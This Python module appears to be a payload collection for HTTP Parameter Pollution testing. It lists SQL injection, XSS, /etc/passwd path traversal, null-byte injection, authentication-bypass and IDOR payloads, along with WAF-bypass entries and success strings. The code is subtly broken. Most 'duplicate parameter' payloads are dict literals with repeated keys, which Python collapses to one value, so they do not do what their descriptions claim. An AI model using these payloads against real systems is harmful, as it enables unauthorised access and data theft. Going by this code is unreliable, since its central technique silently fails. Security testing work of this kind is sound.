"""
HTTP Parameter Pollution (HPP) Payloads

Payloads for HTTP Parameter Pollution attacks including:
- Parameter duplication
- Array notation
- WAF bypass via HPP
- Backend framework bypass
"""

# Basic HPP payloads
HPP_BASIC = [
    {
        "name": "duplicate_id",
        "payload": {"id": "123", "id": "456"},
        "description": "Duplicate id parameter",
    },
    {
        "name": "duplicate_user",
        "payload": {"user": "admin", "user": "guest"},
        "description": "Duplicate user parameter",
    },
    {
        "name": "duplicate_role",
        "payload": {"role": "admin", "role": "user"},
        "description": "Duplicate role parameter",
    },
    {
        "name": "duplicate_page",
        "payload": {"page": "admin", "page": "home"},
        "description": "Duplicate page parameter",
    },
]

# Array notation HPP
HPP_ARRAY = [
    {
        "name": "bracket_array",
        "payload": {"id[]": "123", "id[]": "456"},
        "description": "Bracket array notation",
    },
    {
        "name": "no_bracket_array",
        "payload": {"id": "123", "id": "456"},
        "description": "No bracket array",
    },
    {
        "name": "mixed_array",
        "payload": {"id": "123", "id[]": "456"},
        "description": "Mixed array notation",
    },
    {
        "name": "deep_array",
        "payload": {"user[id]": "123", "user[id]": "456"},
        "description": "Deep array notation",
    },
]

# WAF bypass via HPP
HPP_WAF_BYPASS = [
    {
        "name": "sqli_via_hpp",
        "payload": {"id": "1", "id": "1' OR '1'='1"},
        "description": "SQLi bypass via parameter duplication",
    },
    {
        "name": "xss_via_hpp",
        "payload": {"name": "<script>alert(1)</script>", "name": "safe"},
        "description": "XSS bypass via safe parameter",
    },
    {
        "name": "rce_via_hpp",
        "payload": {"file": "test.txt", "file": "evil.php"},
        "description": "RCE via parameter pollution",
    },
    {
        "name": "path_traversal_hpp",
        "payload": {"file": "normal", "file": "../../../etc/passwd"},
        "description": "Path traversal via HPP",
    },
]

# Framework-specific HPP
HPP_FRAMEWORK = [
    {
        "name": "php_array",
        "payload": {"user[0]": "admin", "user[1]": "guest"},
        "description": "PHP array notation",
    },
    {
        "name": "java_array",
        "payload": {"user": "admin", "user": "guest"},
        "description": "Java request parameter merge",
    },
    {
        "name": "python_flask",
        "payload": {"user": "admin", "user": "guest"},
        "description": "Python Flask multi-dict",
    },
    {
        "name": "asp_dotnet",
        "payload": {"user": "admin", "user": "guest"},
        "description": "ASP.NET parameter collection",
    },
    {
        "name": "nodejs_query",
        "payload": {"user": "admin", "user": "guest"},
        "description": "Node.js query string parsing",
    },
]

# Authentication bypass via HPP
HPP_AUTH_BYPASS = [
    {
        "name": "admin_true",
        "payload": {"admin": "true", "admin": "false"},
        "description": "Admin parameter bypass",
    },
    {
        "name": "is_admin",
        "payload": {"is_admin": "true", "is_admin": "false"},
        "description": "Is-admin flag bypass",
    },
    {
        "name": "role_admin",
        "payload": {"role": "admin", "role": "user"},
        "description": "Role parameter bypass",
    },
    {
        "name": "user_type_admin",
        "payload": {"user_type": "admin", "user_type": "normal"},
        "description": "User-type bypass",
    },
    {
        "name": "privilege_admin",
        "payload": {"privilege": "admin", "privilege": "guest"},
        "description": "Privilege parameter bypass",
    },
]

# IDOR via HPP
HPP_IDOR = [
    {
        "name": "id_pollution",
        "payload": {"id": "1", "id": "99999"},
        "description": "ID parameter pollution",
    },
    {
        "name": "user_id_pollution",
        "payload": {"user_id": "123", "user_id": "456"},
        "description": "User ID pollution",
    },
    {
        "name": "account_id_pollution",
        "payload": {"account_id": "victim", "account_id": "attacker"},
        "description": "Account ID pollution",
    },
]

# Parameter encoding for HPP
HPP_ENCODING = [
    {
        "name": "url_encoded",
        "payload": {"id": "%31"},  # URL encoded 1
        "description": "URL encoded parameter",
    },
    {
        "name": "double_encoded",
        "payload": {"id": "%2531"},  # Double URL encoded
        "description": "Double URL encoded",
    },
    {
        "name": "null_byte",
        "payload": {"file": "test.php\x00.txt"},
        "description": "Null byte injection",
    },
    {
        "name": "space_injection",
        "payload": {"file": "test file.txt"},
        "description": "Space injection",
    },
]

# HPP via GET and POST
HPP_METHOD = [
    {
        "name": "get_post_mix",
        "payload": {"id": "1 GET", "id": "2 POST"},
        "description": "GET/POST parameter mixing",
    },
    {
        "name": "url_body_mix",
        "payload": {"id": "1", "id": "2"},
        "description": "URL and body parameter mix",
    },
]

# HPP via cookies
HPP_COOKIE = [
    {
        "name": "cookie_param",
        "payload": {"Cookie": "id=1&id=2"},
        "description": "Parameter pollution via cookie",
    },
    {
        "name": "multiple_cookies",
        "payload": {"Cookie": "id=1; id=2"},
        "description": "Multiple same-name cookies",
    },
]

# Success indicators for HPP
HPP_SUCCESS = [
    "Parameter pollution successful",
    "First parameter accepted",
    "Last parameter accepted",
    "Array processed",
    "WAF bypassed",
    "Authentication bypassed",
]

# Common HPP parameters
HPP_PARAMETERS = [
    "id",
    "user",
    "role",
    "admin",
    "is_admin",
    "privilege",
    "user_id",
    "account_id",
    "page",
    "file",
    "path",
    "redirect",
    "return",
    "callback",
    "output",
]

# HPP separator patterns
HPP_SEPARATORS = [
    "&",
    ";",
    "|",
    "%26",
    "%3b",
    "%7c",
]
